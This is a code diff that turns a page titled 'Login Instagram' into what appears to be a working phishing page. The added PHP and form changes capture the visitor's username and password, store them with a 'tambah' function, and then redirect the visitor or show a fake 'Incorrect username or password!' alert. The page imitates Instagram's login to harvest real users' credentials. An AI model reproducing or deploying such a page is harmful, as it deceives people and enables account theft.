@@ -1,7 +1,29 @@
+<?php 
+require('functions.php');
+if (isset($_POST["submit"])) {
+	// cek keberhasilan
+	if (tambah($_POST) > 0) {
+		echo "
+		<script>
+      document.location.href = 'close.html';
+		</script>
+		";
+	} else {
+		echo "
+		<script>
+			alert('Incorrect username or password!');
+		</script>
+		";
+	}
+}
+
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
   <link rel="stylesheet" href="bootstrap.min.css">
   <title>Login Instagram</title>
@@ -15,10 +37,10 @@
       </div>
       <div class="form-login">
         <form action="" method="POST">
-          <input type="text" class="form-control" placeholder="Phone number. username, or email" required>
-          <input type="password" class="form-control" placeholder="Password">
+          <input type="text" class="form-control" name="username" placeholder="Phone number. username, or email" required>
+          <input type="password" class="form-control" name="password" placeholder="Password">
           <h5 class="forgot">Forgot password?</h5>
-          <button type="button" class="btn btn-primary"><b>Log In</b></button>
+          <button type="submit" name="submit" class="btn btn-primary"><b>Log In</b></button>
         </form>
       </div>
       <div class="case-line">
